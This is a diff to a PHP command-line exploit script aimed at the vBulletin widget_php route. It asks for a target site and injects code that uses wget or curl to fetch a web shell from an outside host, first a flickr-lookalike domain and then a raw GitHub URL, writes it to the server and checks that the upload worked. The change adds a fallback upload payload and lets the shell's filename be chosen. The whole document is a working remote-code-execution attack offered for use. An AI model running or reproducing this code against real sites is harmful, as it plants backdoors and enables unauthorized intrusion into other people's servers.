@@ -13,7 +13,7 @@ class Exploit {
     $bir = "\033[3;34m";
     echo "{$put}Enter site: ";
     $expl = trim(fgets(STDIN));
-    $shell = "bngsdlo.php";
+    $shell = "bngsdlo.php"; // Terserah ganti pa kgk
     echo "{$bir}[*] Exploiting {$expl}\n\n";
     $c = curl_init();
     $h = [
@@ -34,7 +34,7 @@ class Exploit {
       CURLOPT_URL => $expl."/ajax/render/widget_php",
       CURLOPT_RETURNTRANSFER => true,
       CURLOPT_POST => true,
-      CURLOPT_POSTFIELDS => "widgetConfig[code]=echo system('wget http://flickr.com.tvcw.org/shell.php -O {$shell}');"
+      CURLOPT_POSTFIELDS => "widgetConfig[code]=echo system('wget https://raw.githubusercontent.com/nastar-id/kegabutan/master/asu.php -O {$shell}');"
       ];
       curl_setopt_array($ch, $hc);
       $ex = curl_exec($ch);
@@ -62,12 +62,13 @@ class Exploit {
           print "{$mer}[-] Shell not uploaded!\n";
           sleep(1);
           print "{$bir}[*] Trying to bypass upload\n";
+          $upl = '$cc = curl_init(); curl_setopt($cc, CURLOPT_URL, "https://raw.githubusercontent.com/nastar-id/kegabutan/master/asu.php"); curl_setopt($cc, CURLOPT_RETURNTRANSFER, true); $xx = curl_exec($cc);curl_close($cc);$f = fopen("'.$shell.'", "a+");fwrite($f, $xx);fclose($f);exit;';
           $byp = curl_init();
           $opsi = [
           CURLOPT_URL => $expl."/ajax/render/widget_php",
           CURLOPT_RETURNTRANSFER => true,
           CURLOPT_POST => true,
-          CURLOPT_POSTFIELDS => "widgetConfig[code]=file_get_contents('https://raw.githubusercontent.com/nastar-id/kegabutan/master/asu.php');"
+          CURLOPT_POSTFIELDS => "widgetConfig[code]={$upl};"
           ];
           curl_setopt_array($byp, $opsi);
           $x = curl_exec($byp);
@@ -76,7 +77,7 @@ class Exploit {
        if ($x) {
          $ancurl = curl_init();
          $opt = [
-         CURLOPT_URL => $expl."/nstr.php",
+         CURLOPT_URL => $expl."/".$shell,
          CURLOPT_RETURNTRANSFER => true
          ];
          curl_setopt_array($ancurl, $opt);
